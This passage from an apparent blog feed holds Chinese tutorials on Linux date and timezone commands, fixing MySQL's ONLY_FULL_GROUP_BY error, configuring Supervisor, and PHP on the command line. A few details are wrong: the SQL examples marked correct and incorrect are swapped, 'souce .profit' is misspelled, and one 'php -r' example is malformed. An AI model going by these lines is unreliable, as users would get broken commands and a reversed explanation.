小时，24小时制（00~23）</span><br><span class="line">%I 小时，12小时制（01~12）</span><br><span class="line">%k 小时，24小时制（0~23）</span><br><span class="line">%l 小时，12小时制（1~12）</span><br><span class="line">%M 分钟（00~59）</span><br><span class="line">%p 显示出AM或PM</span><br><span class="line">%r 显示时间，12小时制（hh:mm:ss %p）</span><br><span class="line">%s 从1970年1月1日00:00:00到目前经历的秒数</span><br><span class="line">%S 显示秒（00~59）</span><br><span class="line">%T 显示时间，24小时制（hh:mm:ss）</span><br><span class="line">%X 显示时间的格式（%H:%M:%S）</span><br><span class="line">%Z 以字符串的形式显示时区，日期域（CST）</span><br><span class="line">%z 以数字的形式显示时区 (+0800)</span><br><span class="line">%a 星期的简称（Sun~Sat）</span><br><span class="line">%A 星期的全称（Sunday~Saturday）</span><br><span class="line">%h,%b 月的简称（Jan~Dec）</span><br><span class="line">%B 月的全称（January~December）</span><br><span class="line">%c 日期和时间（Tue Nov 20 14:12:58 2012）</span><br><span class="line">%d 一个月的第几天（01~31）</span><br><span class="line">%x,%D 日期（mm&#x2F;dd&#x2F;yy）</span><br><span class="line">%j 一年的第几天（001~366）</span><br><span class="line">%m 月份（01~12）</span><br><span class="line">%w 一个星期的第几天（0代表星期天）</span><br><span class="line">%W 一年的第几个星期（00~53，星期一为第一天）</span><br><span class="line">%y 年的最后两个数字（1999则是99）</span><br></pre></td></tr></table></figure><h2 id="timedatectl"><a href="#timedatectl" class="headerlink" title="timedatectl"></a>timedatectl</h2><p>timedatectl 命令非常的方便，当你不带任何参数运行它时，这条命令可以像下图一样，输出系统时间概览，其中包含当前时区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">$ timedatectl</span><br><span class="line"></span><br><span class="line">Local time: Thu 2020-07-30 05:30:21 UTC</span><br><span class="line">                  Universal time: Thu 2020-07-30 05:30:21 UTC</span><br><span class="line">                        RTC time: Thu 2020-07-30 05:30:21</span><br><span class="line">                       Time zone: Etc&#x2F;UTC (UTC, +0000)</span><br><span class="line">       System clock synchronized: yes</span><br><span class="line">systemd-timesyncd.service active: yes</span><br><span class="line">                 RTC in local TZ: no</span><br></pre></td></tr></table></figure><p>只查看时区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ timedatectl | grep &quot;Time zone&quot;</span><br></pre></td></tr></table></figure><h2 id="etc-timezone"><a href="#etc-timezone" class="headerlink" title="/etc/timezone"></a>/etc/timezone</h2><p>使用 cat 命令显示文件 <code>/etc/timezone</code> 的内容，来查看时区：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cat &#x2F;etc&#x2F;timezone</span><br><span class="line">Etc&#x2F;UTC</span><br></pre></td></tr></table></figure><p>选择时区</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ tzselect</span><br></pre></td></tr></table></figure><p>选择完成之后，将时区相关的配置，写入<code>.profit</code>配置文件中。</p><p>然后使用 souce 命令，强制生效。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">souce .profit</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://linux.cn/article-7970-1.html" target="_blank" rel="noopener">在 Linux 中查看时区</a></li><li><a href="https://man.linuxde.net/date" target="_blank" rel="noopener">Linux date 命令</a></li><li><a href="https://24timezones.com/map_zh.php#/map" target="_blank" rel="noopener">世界时钟地图</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;最近遇到一个跟服务器时区相关的问题，没准备充分，当问题真正来临时，很懵。&lt;/p&gt;
&lt;p&gt;特别是在生产环境中，系统时区是特别重要的存在，很多应用在默认情况下，都是取的系统时区，如果时区处理不得当的话，可能会造成不必要的困扰。&lt;/p&gt;</summary>
    
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/categories/Linux/"/>
    
    
    <category term="Linux" scheme="https://www.0x2beace.com/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>Mysql only_full_group_by 异常记录</title>
    <link href="https://www.0x2beace.com/mysql-only-full-group-by-exception-record/"/>
    <id>https://www.0x2beace.com/mysql-only-full-group-by-exception-record/</id>
    <published>2020-07-31T12:17:14.000Z</published>
    <updated>2021-06-14T08:18:25.903Z</updated>
    
    <content type="html"><![CDATA[<p>最近很频繁的遇到一个Mysql 异常，错误信息如下：</p><blockquote><p>Expression #5 of SELECT list is not in GROUP BY clause and contains nonaggregated column ‘cis.q1.query_date’ which is not functionally dependent on columns in GROUP BY clause; this is incompatible with sql_mode=only_full_group_by</p></blockquote><p>通过错误信息可以看到，是因为 <code>sql_mode</code> 引起的。</p><p>查看Mysql 当前所使用的 <code>sql_mode</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">select @@sql_mode</span><br><span class="line"></span><br><span class="line">+-------------------------+</span><br><span class="line">|       @@sql_mode        |</span><br><span class="line">+-------------------------+</span><br><span class="line">|   ONLY_FULL_GROUP_BY    |</span><br><span class="line">+-------------------------+</span><br></pre></td></tr></table></figure><h2 id="sql-mode-配置解析"><a href="#sql-mode-配置解析" class="headerlink" title="sql_mode 配置解析"></a>sql_mode 配置解析</h2><h3 id="ONLY-FULL-GROUP-BY"><a href="#ONLY-FULL-GROUP-BY" class="headerlink" title="ONLY_FULL_GROUP_BY"></a>ONLY_FULL_GROUP_BY</h3><p>对于GROUP BY聚合操作，如果在SELECT中的列，没有在GROUP BY中出现，那么这个SQL是不合法的，因为列不在GROUP BY从句中。简而言之，就是SELECT后面接的列必须被GROUP BY后面接的列所包含。如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">❎</span><br><span class="line">select a,b from table group by a,b,c; </span><br><span class="line"></span><br><span class="line">✅</span><br><span class="line">select a,b,c from table group by a,b;</span><br></pre></td></tr></table></figure><p>这个配置会使得GROUP BY语句环境变得十分狭窄，所以一般都不加这个配置</p><h3 id="NO-AUTO-VALUE-ON-ZERO"><a href="#NO-AUTO-VALUE-ON-ZERO" class="headerlink" title="NO_AUTO_VALUE_ON_ZERO"></a>NO_AUTO_VALUE_ON_ZERO</h3><p>该值影响自增长列的插入。默认设置下，插入0或NULL代表生成下一个自增长值。（不信的可以试试，默认的sql_mode你在自增主键列设置为0，该字段会自动变为最新的自增值，效果和null一样），如果用户希望插入的值为0（不改变），该列又是自增长的，那么这个选项就有用了。</p><h3 id="STRICT-TRANS-TABLES"><a href="#STRICT-TRANS-TABLES" class="headerlink" title="STRICT_TRANS_TABLES"></a>STRICT_TRANS_TABLES</h3><p>在该模式下，如果一个值不能插入到一个事务表中，则中断当前的操作，对非事务表不做限制。（InnoDB默认事务表，MyISAM默认非事务表；MySQL事务表支持将批处理当做一个完整的任务统一提交或回滚，即对包含在事务中的多条语句要么全执行，要么全部不执行。非事务表则不支持此种操作，批处理中的语句如果遇到错误，在错误前的语句执行成功，之后的则不执行；MySQL事务表有表锁与行锁非事务表则只有表锁）</p><h3 id="NO-ZERO-IN-DATE"><a href="#NO-ZERO-IN-DATE" class="headerlink" title="NO_ZERO_IN_DATE"></a>NO_ZERO_IN_DATE</h3><p>在严格模式下，不允许日期和月份为零</p><h3 id="NO-ZERO-DATE"><a href="#NO-ZERO-DATE" class="headerlink" title="NO_ZERO_DATE"></a>NO_ZERO_DATE</h3><p>设置该值，mysql数据库不允许插入零日期，插入零日期会抛出错误而不是警告。</p><h3 id="ERROR-FOR-DIVISION-BY-ZERO"><a href="#ERROR-FOR-DIVISION-BY-ZERO" class="headerlink" title="ERROR_FOR_DIVISION_BY_ZERO"></a>ERROR_FOR_DIVISION_BY_ZERO</h3><p>在INSERT或UPDATE过程中，如果数据被零除，则产生错误而非警告。如 果未给出该模式，那么数据被零除时MySQL返回NULL</p><h3 id="NO-AUTO-CREATE-USER"><a href="#NO-AUTO-CREATE-USER" class="headerlink" title="NO_AUTO_CREATE_USER"></a>NO_AUTO_CREATE_USER</h3><p>禁止GRANT创建密码为空的用户</p><h3 id="NO-ENGINE-SUBSTITUTION"><a href="#NO-ENGINE-SUBSTITUTION" class="headerlink" title="NO_ENGINE_SUBSTITUTION"></a>NO_ENGINE_SUBSTITUTION</h3><p>如果需要的存储引擎被禁用或未编译，那么抛出错误。不设置此值时，用默认的存储引擎替代，并抛出一个异常</p><h3 id="PIPES-AS-CONCAT"><a href="#PIPES-AS-CONCAT" class="headerlink" title="PIPES_AS_CONCAT"></a>PIPES_AS_CONCAT</h3><p>将”||”视为字符串的连接操作符而非或运算符，这和Oracle数据库是一样的，也和字符串的拼接函数Concat相类似</p><h3 id="ANSI-QUOTES"><a href="#ANSI-QUOTES" class="headerlink" title="ANSI_QUOTES"></a>ANSI_QUOTES</h3><p>启用ANSI_QUOTES后，不能用双引号来引用字符串，因为它被解释为识别符</p><h2 id="解决方案"><a href="#解决方案" class="headerlink" title="解决方案"></a>解决方案</h2><p>有三种方式可以解决该问题。</p><h3 id="关闭-ONLY-FULL-GROUP-BY"><a href="#关闭-ONLY-FULL-GROUP-BY" class="headerlink" title="关闭 ONLY_FULL_GROUP_BY"></a>关闭 ONLY_FULL_GROUP_BY</h3><p>关闭 Mysql 的 ONLY_FULL_GROUP_BY 模式 又有两种方式。</p><p>方式一：通过以下命令关闭：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">SET SESSION sql_mode=(SELECT REPLACE(@@sql_mode,'ONLY_FULL_GROUP_BY,',''));</span><br></pre></td></tr></table></figure><p>方式二：编辑<code>my.cnf</code>配置文件，可以通过以下命令查看配置文件所在目录：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mysql --help | grep cnf</span><br><span class="line">                      order of preference, my.cnf, $MYSQL_TCP_PORT,</span><br><span class="line">/etc/my.cnf /etc/mysql/my.cnf /usr/local/etc/my.cnf ~/.my.cnf</span><br></pre></td></tr></table></figure><p>将 <code>ONLY_FULL_GROUP_BY</code> 关键字去掉：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[mysqld]</span><br><span class="line">sql_mode = ""</span><br></pre></td></tr></table></figure><p>然后重启Mysql 服务即可。</p><h3 id="ANY-VALUE"><a href="#ANY-VALUE" class="headerlink" title="ANY_VALUE"></a>ANY_VALUE</h3><p>如果你不想更新配置文件，Mysql 还提供一种临时的解决方案——<a href="https://dev.mysql.com/doc/refman/8.0/en/miscellaneous-functions.html#function_any-value" target="_blank" rel="noopener">ANY_VALUE()</a>。</p><p>使用 <code>ANY_VALUE()</code> 包裹的值不会被检查，跳过该错误。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">✅</span><br><span class="line">select ANY_VALUE(a), ANY_VALUE(b), ANY_VALUE(c)</span><br><span class="line">from table </span><br><span class="line">group by a,b;</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="https://blog.csdn.net/Abysscarry/article/details/79468411" target="_blank" rel="noopener">记一次Group by 查询时的ONLY_FULL_GROUP_BY错误以及后续</a></li><li><a href="https://www.cnblogs.com/Wayou/p/mysql_group_by_issue.html" target="_blank" rel="noopener">MySQL GROUP BY 的问题</a></li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;最近很频繁的遇到一个Mysql 异常，错误信息如下：&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Expression #5 of SELECT list is not in GROUP BY clause and contains nonaggregated column ‘</summary>
      
    
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/categories/Mysql/"/>
    
    
    <category term="Mysql" scheme="https://www.0x2beace.com/tags/Mysql/"/>
    
  </entry>
  
  <entry>
    <title>Supervisor 快速上手</title>
    <link href="https://www.0x2beace.com/supervisor-quick-start/"/>
    <id>https://www.0x2beace.com/supervisor-quick-start/</id>
    <published>2020-07-30T12:38:38.000Z</published>
    <updated>2020-09-04T13:54:06.076Z</updated>
    
    <content type="html"><![CDATA[<p><a href="http://supervisord.org/" target="_blank" rel="noopener">supervisord</a> 是一个用 Python 写的进程管理工具，是类Unix系统中的一个进程管理工具，</p><p><code>Supervisor</code> 只适用于类Unix 系统，不适用于Window。</p><a id="more"></a><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>因为<code>Supervisor</code> 是用 <code>Python</code> 所写的，所以可以直接使用<code>pip</code> 安装：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install supervisor</span><br></pre></td></tr></table></figure><p>Ubuntu：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install supervisor</span><br></pre></td></tr></table></figure><p>Mac：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew install supervisor</span><br></pre></td></tr></table></figure><h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><p><code>Supervisor</code>运行时会启动一个进程——<code>supervisord</code> 。</p><ul><li><code>supervisord</code>：它负责启动所管理的进程，并将所管理的进程作为自己的子进程来启动，而且可以在所管理的进程出现崩溃时自动重启。</li><li><code>supervisorctl</code>：是命令行管理工具，可以用来执行 stop、start、restart 等命令，来对这些子进程进行管理。</li></ul><p>查看默认配置项</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ echo_supervisord_conf</span><br></pre></td></tr></table></figure><p>将默认配置项重定向至配置文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ echo_supervisord_conf &gt; &#x2F;etc&#x2F;supervisord.conf</span><br></pre></td></tr></table></figure><p>然后可以看到 <code>/etc/</code> 配置文件下出现了以下文件，其中<code>/etc/supervisor</code> 是我们需要的配置文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ find &#x2F;etc&#x2F; -name supervisor</span><br><span class="line">&#x2F;etc&#x2F;default&#x2F;supervisor</span><br><span class="line">&#x2F;etc&#x2F;init.d&#x2F;supervisor</span><br><span class="line">&#x2F;etc&#x2F;supervisor</span><br></pre></td></tr></table></figure><p><code>/etc/supervisord.conf</code> 核心配置文件，参考以下部分配置，<code>;</code> 表示注释。</p><p>因为<code>Supervisor</code>默认配置会把socket文件和pid守护进程生成在/tmp/目录下，/tmp/目录是缓存目录，所以我们需要手动换成<code>/var/run</code>目录。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">[unix_http_server]</span><br><span class="line">;file&#x3D;&#x2F;tmp&#x2F;supervisor.sock   ; UNIX socket 文件，supervisorctl 会使用</span><br><span class="line">file&#x3D;&#x2F;var&#x2F;run&#x2F;supervisor.sock   ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除</span><br><span class="line">;chmod&#x3D;0700                 ; socket 文件的 mode，默认是 0700</span><br><span class="line">;chown&#x3D;nobody:nogroup       ; socket 文件的 owner，格式： uid:gid</span><br><span class="line"></span><br><span class="line">;[inet_http_server]         ; HTTP 服务器，提供 web 管理界面</span><br><span class="line">;port&#x3D;127.0.0.1:9001        ; Web 管理后台运行的 IP 和端口，如果开放到公网，需要注意安全性</span><br><span class="line">;username&#x3D;user              ; 登录管理后台的用户名</span><br><span class="line">;password&#x3D;123               ; 登录管理后台的密码</span><br><span class="line"></span><br><span class="line">[supervisord]</span><br><span class="line">;logfile&#x3D;&#x2F;tmp&#x2F;supervisord.log ; 日志文件，默认是 $CWD&#x2F;supervisord.log</span><br><span class="line">logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;supervisord.log ; 修改为 &#x2F;var&#x2F;log 目录，避免被系统删除</span><br><span class="line">logfile_maxbytes&#x3D;50MB        ; 日志文件大小，超出会 rotate，默认 50MB</span><br><span class="line">logfile_backups&#x3D;10           ; 日志文件保留备份数量默认 10</span><br><span class="line">loglevel&#x3D;info                ; 日志级别，默认 info，其它: debug,warn,trace</span><br><span class="line">;pidfile&#x3D;&#x2F;tmp&#x2F;supervisord.pid ; pid 文件</span><br><span class="line">pidfile&#x3D;&#x2F;var&#x2F;run&#x2F;supervisord.pid ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除</span><br><span class="line">nodaemon&#x3D;false               ; 是否在前台启动，默认是 false，即以 daemon 的方式启动</span><br><span class="line">minfds&#x3D;1024                  ; 可以打开的文件描述符的最小值，默认 1024</span><br><span class="line">minprocs&#x3D;200                 ; 可以打开的进程数的最小值，默认 200</span><br><span class="line"></span><br><span class="line">; the below section must remain in the config file for RPC</span><br><span class="line">; (supervisorctl&#x2F;web interface) to work, additional interfaces may be</span><br><span class="line">; added by defining them in separate rpcinterface: sections</span><br><span class="line">[rpcinterface:supervisor]</span><br><span class="line">supervisor.rpcinterface_factory &#x3D; supervisor.rpcinterface:make_main_rpcinterface</span><br><span class="line"></span><br><span class="line">[supervisorctl]</span><br><span class="line">;serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;tmp&#x2F;supervisor.sock ; 通过 UNIX socket 连接 supervisord，路径与 unix_http_server 部分的 file 一致</span><br><span class="line">serverurl&#x3D;unix:&#x2F;&#x2F;&#x2F;var&#x2F;run&#x2F;supervisor.sock ; 修改为 &#x2F;var&#x2F;run 目录，避免被系统删除</span><br><span class="line">;serverurl&#x3D;http:&#x2F;&#x2F;127.0.0.1:9001 ; 通过 HTTP 的方式连接 supervisord</span><br><span class="line"></span><br><span class="line">; 包含其他的配置文件</span><br><span class="line">[include]</span><br><span class="line">files &#x3D; relative&#x2F;directory&#x2F;*.ini    ; 可以是 *.conf 或 *.ini</span><br></pre></td></tr></table></figure><p><code>/etc/supervisor/conf.d</code> 则是用来配置管理进程的配置文件，所有需要被<code>supervisor</code> 管理的进程都需要在这里先配置。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">[program:demo]</span><br><span class="line">command&#x3D;php demo.php  &#x2F;&#x2F; 需要执行队列的名称</span><br><span class="line">directory&#x3D; &#x2F;var&#x2F;www  &#x2F;&#x2F; 命令执行的目录或者说执行 command 之前，先切换到工作目录 可以理解为在执行命令前会切换到这个目录 </span><br><span class="line">process_name&#x3D;%(process_num)02d &#x2F;&#x2F; 默认为 %(program_name)s，即 [program:x] 中的 x这个是进程名，如果下面的numprocs参数为1的话，就不用管这个参数了，它默认值%(program_name)s也就是上面的那个program冒号后面的</span><br><span class="line"></span><br><span class="line">numprocs&#x3D;1          &#x2F;&#x2F; 进程数量当不为1时的时候，就是进程池的概念，注意process_name的设置</span><br><span class="line">autostart&#x3D;true    &#x2F;&#x2F; 是否自动启动</span><br><span class="line">autorestart&#x3D;true      &#x2F;&#x2F; 程序意外退出是否自动重启</span><br><span class="line">startsecs&#x3D;1       &#x2F;&#x2F; 自动重启间隔 </span><br><span class="line">startretries&#x3D;20   &#x2F;&#x2F; 当进程启动失败后，最大尝试启动的次数。。当超过3次后，supervisor将把此进程的状态置为FAIL 默认值为3</span><br><span class="line">redirect_stderr&#x3D;true  &#x2F;&#x2F; 如果为true，则stderr的日志会被写入stdout日志文件中  理解为重定向输出的日志</span><br><span class="line">user&#x3D;root   &#x2F;&#x2F; 这个参数可以设置一个非root用户，当我们以root用户启动supervisord之后。我这里面设置的这个用户，也可以对supervisord进行管理 </span><br><span class="line">stopsignal&#x3D;INT</span><br><span class="line">stderr_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;demo.err.log   &#x2F;&#x2F; 子进程的stdout的日志路径 输出日志文件</span><br><span class="line">stdout_logfile&#x3D;&#x2F;var&#x2F;log&#x2F;supervisor&#x2F;demo.out.log   &#x2F;&#x2F; 错误日志文件 当redirect_stderr&#x3D;true。这个就不用</span><br></pre></td></tr></table></figure><h2 id="启动"><a href="#启动" class="headerlink" title="启动"></a>启动</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ supervisord -c &#x2F;etc&#x2F;supervisord.conf</span><br></pre></td></tr></table></figure><h3 id="常用命令整理"><a href="#常用命令整理" class="headerlink" title="常用命令整理"></a>常用命令整理</h3><p>停止进程，program_name 为 [program:x] 里的 x</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl stop program_name</span><br></pre></td></tr></table></figure><p>启动进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl start program_name</span><br></pre></td></tr></table></figure><p>重启进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl restart program_name</span><br></pre></td></tr></table></figure><p>结束所有属于名为 groupworker 这个分组的进程 (start，restart 同理)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl stop groupworker:</span><br></pre></td></tr></table></figure><p>结束 groupworker:name1 这个进程 (start，restart 同理)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl stop groupworker:name1</span><br></pre></td></tr></table></figure><p>停止全部进程，注：start、restart、stop 都不会载入最新的配置文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl stop all</span><br></pre></td></tr></table></figure><p>载入最新的配置文件，停止原有进程并按新的配置启动、管理所有进程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl reload</span><br></pre></td></tr></table></figure><p>根据最新的配置文件，启动新配置或有改动的进程，配置没有改动的进程不会受影响而重启</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">supervisorctl update</span><br></pre></td></tr></table></figure><h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><h4 id="unlinking-stale-socket-var-run-supervisor-sock"><a href="#unlinking-stale-socket-var-run-supervisor-sock" class="headerlink" title="unlinking stale socket /var/run/supervisor.sock"></a>unlinking stale socket /var/run/supervisor.sock</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">$ find &#x2F; -name supervisor.sock</span><br><span class="line">&#x2F;run&#x2F;supervisor.sock</span><br><span class="line"></span><br><span class="line">$ unlink &#x2F;run&#x2F;supervisor.sock</span><br></pre></td></tr></table></figure><h3 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h3><ul><li><a href="http://m.aluaa.com/articles/2019/01/02/1546398594207.html" target="_blank" rel="noopener">“unix:///tmp/supervisor.sock no such file” 错误处理</a></li><li><a href="https://segmentfault.com/a/1190000015768529" target="_blank" rel="noopener">https://segmentfault.com/a/1190000015768529</a></li><li><a href="http://liyangliang.me/posts/2015/06/using-supervisor/" target="_blank" rel="noopener">使用 supervisor 管理进程</a></li><li><a href="https://www.cnblogs.com/restran/p/4854623.html" target="_blank" rel="noopener">Python 进程管理工具 Supervisor 使用教程</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;p&gt;&lt;a href=&quot;http://supervisord.org/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;supervisord&lt;/a&gt; 是一个用 Python 写的进程管理工具，是类Unix系统中的一个进程管理工具，&lt;/p&gt;
&lt;p&gt;&lt;code&gt;Supervisor&lt;/code&gt; 只适用于类Unix 系统，不适用于Window。&lt;/p&gt;</summary>
    
    
    
    <category term="PHP" scheme="https://www.0x2beace.com/categories/PHP/"/>
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/categories/PHP/Tutorial/"/>
    
    <category term="进程管理" scheme="https://www.0x2beace.com/categories/PHP/Tutorial/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
    
    
    <category term="Tutorial" scheme="https://www.0x2beace.com/tags/Tutorial/"/>
    
    <category term="PHP" scheme="https://www.0x2beace.com/tags/PHP/"/>
    
    <category term="进程管理" scheme="https://www.0x2beace.com/tags/%E8%BF%9B%E7%A8%8B%E7%AE%A1%E7%90%86/"/>
    
    <category term="Supervisor" scheme="https://www.0x2beace.com/tags/Supervisor/"/>
    
  </entry>
  
  <entry>
    <title>在 Linux 命令行中执行和使用 PHP 代码</title>
    <link href="https://www.0x2beace.com/execute-and-use-php-code-on-the-linux-command-line/"/>
    <id>https://www.0x2beace.com/execute-and-use-php-code-on-the-linux-command-line/</id>
    <published>2020-07-29T00:08:12.000Z</published>
    <updated>2020-11-27T03:05:13.069Z</updated>
    
    <content type="html"><![CDATA[<p>众所周知，PHP是一门脚本语言，主要用于服务端（JavaScript 用于客户端）以通过HTTP 生成动态网页。</p><a id="more"></a><p>所以与其他脚本语言一样，可以直接在终端中不需要网页浏览器来运行PHP 代码。</p><h2 id="获取安装信息"><a href="#获取安装信息" class="headerlink" title="获取安装信息"></a>获取安装信息</h2><p>在安装完PHP 以及Nginx 之后，接下来我们通常需要做的是，在<code>/usr/local/var/www</code> (Mac 上的Nginx 工作目录)上创建一个内容为<code>&lt;?php phpinfo(); ?&gt;</code>，名为index.php的文件来测试PHP 是否安装正确。</p><p>执行以下命令即可：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># echo &#39;&lt;?php phpinfo(); ?&gt;&#39; &gt; &#x2F;usr&#x2F;local&#x2F;var&#x2F;www&#x2F;index.php</span><br></pre></td></tr></table></figure><p>然后，使用浏览器访问<code>http://127.0.0.1/index.php</code>，不出意外可以看到：</p><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200930151004.png" alt=""></p><blockquote><p>如何在终端中直接查看该信息？</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># php -f &#x2F;usr&#x2F;local&#x2F;var&#x2F;www&#x2F;index.php | less</span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/0xAiKang/CDN/blog/images/20200930151053.png" alt=""></p><p>如果你觉得上面这种方式太麻烦了，那么还有一种更简便的方式可以达到同样的效果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># php -r &#39;php phpinfo();&#39; | less</span><br></pre></td></tr></table></figure><h3 id="交互模式"><a href="#交互模式" class="headerlink" title="交互模式"></a>交互模式</h3><p>有时候我们会遇到这样一种情况，想测试一小段代码，看看其运行结果，但是又不想重新创建一个文件，太麻烦了。</p><p>如果这个时候有一个地方可以直接运行这段代码且输出结果，那该多好啊。</p><p>PHP 为我们提供了两种交互模式，前者是自动的，后者是手动的。</p><ol><li>Interactive shell</li><li>Interactive mode enabled</li></ol><p>两种模式都是使用 <code>php -a</code> 命令进入。</p><h4 id="Interactive-shell"><a href="#Interactive-shell" class="headerlink" title="Interactive shell"></a>Interactive shell</h4><p>使用这个交互式shell，你可以直接在命令行窗口里输入PHP并直接获得输出结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 